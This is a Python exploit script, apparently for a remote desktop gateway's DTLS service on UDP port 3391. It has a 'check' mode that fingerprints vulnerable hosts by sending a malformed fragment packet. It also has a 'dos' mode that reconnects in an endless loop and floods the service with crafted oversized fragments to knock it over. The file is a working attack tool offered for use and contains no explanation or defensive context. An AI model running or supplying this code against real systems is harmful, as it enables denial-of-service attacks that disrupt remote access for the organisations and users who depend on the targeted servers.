from pwn import *
from argparse import *
from cryptography.hazmat.bindings.openssl.binding import Binding
from OpenSSL import SSL
import select

TIMEOUT = 3

# need DTLS sockets

RED = '\033[31m'
GREEN = '\033[32m'
BLUE = '\033[34m'
RESET = '\033[0m'


def good(s):
    print(f'{GREEN}[>] {s} {RESET}'.format())


def bad(s):
    print(f'{RED}[>] {s} {RESET}'.format())


def ok(s):
    print(f'{BLUE}[>] {s} {RESET}'.format())

def init_dtls():
    binding = Binding()
    binding.init_static_locks()
    SSL.Context._methods[0] = getattr(binding.lib, "DTLSv1_client_method")




class Packet:
    def __init__(self, fragment, packet_id, fragment_id, num_fragments, fragment_length):

        self.fragment = fragment
        self.packet_id = packet_id
        self.fragment_id = fragment_id
        self.num_fragments = num_fragments
        self.fragment_length = fragment_length

    def __bytes__(self):
        return (struct.pack("<HHHHH",
                            self.packet_id,           # packet id
                            len(self.fragment) + 6,   # packet length
                            self.fragment_id,         # fragment id
                            self.num_fragments,  # number of fragments
                            self.fragment_length      # fragment length
                            ) + self.fragment)


class Connection:
    def __init__(self, host, port):
        init_dtls()
        ok(f"Connecting to {host} at {port}".format())
        self.socket = socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM)
        self.connec = SSL.Connection(SSL.Context(0), self.socket)
        self.connec.connect((host, port))
        self.connec.do_handshake()

    def send(self, packet: Packet):
        self.connec.send(bytes(packet))

    def recv(self, size):
        return self.connec.recv(size)

    def check(self):
        pk = Packet(b"\x00", 5, 0, 65, 1)
        self.send(pk)

        ready = select.select([self.socket], [], [], TIMEOUT)
        if ready[0]:
            res = self.recv(16)

            x = not (0x8000ffff == struct.unpack('<L', res[-4:])[0])

            if (x):
                good("Host is vulnerable")
            else:
                good("Host is not vulnerable")
        else:
            good("Host is vulnerable")

    def dos(self, x):
        pk = Packet(b"\x20" * 1000, 5, x, x, 1000)
        self.send(pk)


if __name__ == "__main__":
    p = ArgumentParser()
    choices = ["check", "dos"]
    p.add_argument("--ip", default='127.0.0.1',
                   help="IP", required=False, type=str)
    p.add_argument("--port", default=3391, help="UDP port",
                   required=False, type=int)
    p.add_argument("--attack", default="check", help="Attack type",
                   required=False, type=str, choices=choices)

    args = p.parse_args()
    attack = choices.index(args.attack)

    if (attack == 0):
        c = Connection(args.ip, args.port)
        c.check()

    elif (attack == 1):
        x = 0
        while x >= 0:
            c = Connection(args.ip, args.port)
            for i in range(50):
                c.dos(x + i)
            x += 1
